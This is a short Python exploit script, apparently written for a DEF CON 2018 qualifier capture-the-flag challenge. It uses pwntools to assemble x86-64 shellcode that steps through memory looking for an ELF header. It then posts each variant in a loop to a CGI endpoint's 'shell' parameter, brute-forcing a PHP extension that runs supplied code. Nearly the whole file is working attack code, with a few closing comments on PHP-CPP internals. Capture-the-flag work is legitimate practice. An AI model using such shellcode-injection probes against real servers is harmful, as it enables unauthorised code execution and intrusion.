#!/usr/bin/env python

import requests
from pwn import *

url = "http://b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php"

#f = open("shellcode.o", "rb")
#payload = f.read()
#f.close()


sub = '''
	xor r8,r8
	loop:
	add ax, 0xfff
	inc ax
	inc r8
	cmp r8, value
	jle loop
	'''

#; look for \x7fELF

shellcode = '''
mov edx, dword [rax]
cmp edx, 0x464c457f
je hang
int3

hang:
	jmp $

ret
'''
payload = ''
for i in xrange(1500,1600):
	print "Testing: %d" % i
	payload = asm(sub.replace("value", str(i)) + shellcode, arch = 'amd64')

	headers = {"Content-Type": "application/x-www-form-urlencoded"}
	r = requests.post(url, data={"shell": payload}, headers=headers)

	print r.text

"""
Loads the module object
Adds the shellme(Php::Parameters &) function to the module namespace

Php::Parameters' object (which is a std::vector of Php::Value objects
Php::Value class is a powerful class that does the same as a regular PHP $variable

"""